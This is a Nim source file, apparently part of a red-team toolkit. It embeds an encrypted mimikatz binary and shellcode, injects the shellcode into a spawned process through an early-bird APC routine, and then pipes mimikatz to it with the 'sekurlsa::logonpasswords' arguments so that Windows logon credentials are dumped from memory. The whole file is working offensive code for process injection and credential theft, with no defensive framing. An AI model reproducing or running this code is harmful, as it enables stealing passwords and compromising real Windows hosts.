import winim
import strformat
import winim/winstr
import ../rth/spawning/early_bird_apc
import ../rth/rth


const mimData  = slurp("/home/msc/documents/python/red-team-server/testing/mimikatz.exe.enc")
#const mimData  = slurp("/home/msc/documents/python/red-team-server/testing/Test_NativeExe.exe.enc")
const shellcodeSlurp  = slurp("./spawnExec.shellcode")

var payload = cast[seq[byte]](mimData)
var shellcode = cast[seq[byte]](shellcodeSlurp)

var toolOutput = ""



proc readPipe(readHandle: HANDLE) =

  var buffer = alloc(500)
  var status: BOOL
  var bytesRead: DWORD

  while true:
    status = ReadFile(
            readHandle,
            buffer,
            cast[DWORD](500),
            addr bytesRead,
            NULL
        )

    echo fmt"Result: {status} BytesRead: {bytesRead}"
    if status == FALSE or bytesRead == 0:
      continue

    toolOutput &= $(cast[cstring](buffer))
    zeroMem(buffer, 500)



# create named pipe server
var pipe: HANDLE = CreateNamedPipe(
  r"\\.\pipe\dafuqdafuq",
  PIPE_ACCESS_DUPLEX,
  PIPE_TYPE_BYTE,
  1,
  0,
  0,
  0,
  NULL
)

if not bool(pipe) or pipe == INVALID_HANDLE_VALUE:
  echo "[X] Server pipe creation failed"
  quit(1)



# Creating the process for spawning
var
  si: STARTUPINFOEX
  ps: SECURITY_ATTRIBUTES
  childRead: HANDLE
  childWrite: HANDLE

si.StartupInfo.cb = sizeof(si).cint
# Setup SECURIT ATTRIBUTES
ps.nLength = sizeof(ps).cint
ps.bInheritHandle = TRUE
ps.lpSecurityDescriptor = NULL


if CreatePipe(addr childRead, addr childWrite, addr ps, 0) == TRUE:
  echo "Created PIPE"
else:
  echo "Failed to Create PIPE"

if SetHandleInformation(childRead, HANDLE_FLAG_INHERIT, 0) == TRUE:
  echo "Set Info"
else:
  echo "Failed to Set Info"

si.StartupInfo.cb = sizeof(si).cint
si.StartupInfo.hStdError = childWrite
si.StartupInfo.hStdOutput = childWrite
si.StartupInfo.dwFlags = si.StartupInfo.dwFlags or STARTF_USESTDHANDLES


var p = Payload(bytes: shellcode)
discard p.execute(childRead, childWrite)


try:
  echo "[*] Waiting for client(s)"
  var result: BOOL = ConnectNamedPipe(pipe, NULL)
  echo "[*] Client connected"


  var size: DWORD = cast[DWORD](len(payload))
  var arguments = "\"blah\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
  var sizeArgs: DWORD = int32(len(arguments))
  var
    bytesWritten: DWORD
    bytesRead: DWORD


  echo "[*] Writing payload size to pipe"
  result = WriteFile(
      pipe,
      addr size,
      (DWORD) sizeof(DWORD),
      addr bytesWritten,
      NULL
  )

  echo "[*] Writing argument size to pipe"

  result = WriteFile(
      pipe,
      addr sizeArgs,
      (DWORD) sizeof(DWORD),
      addr bytesWritten,
      NULL
  )

  echo "[*] Writing payload to pipe"
  result = WriteFile(
      pipe,
      addr payload[0],
      (DWORD)len(payload),
      addr bytesWritten,
      NULL
  )

  echo "[*] Writing arguments to pipe"

  result = WriteFile(
      pipe,
      arguments.cstring,
      (DWORD)len(arguments),
      addr bytesWritten,
      NULL
  )

  echo "[*] bytes written: ", bytesWritten


  var threadHndl = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](readPipe), cast[LPVOID](childRead), 0, NULL)
  WaitForSingleObject(threadHndl, 5000) # wait 5 secondos for full output

  echo toolOutput
finally:
  CloseHandle(pipe)

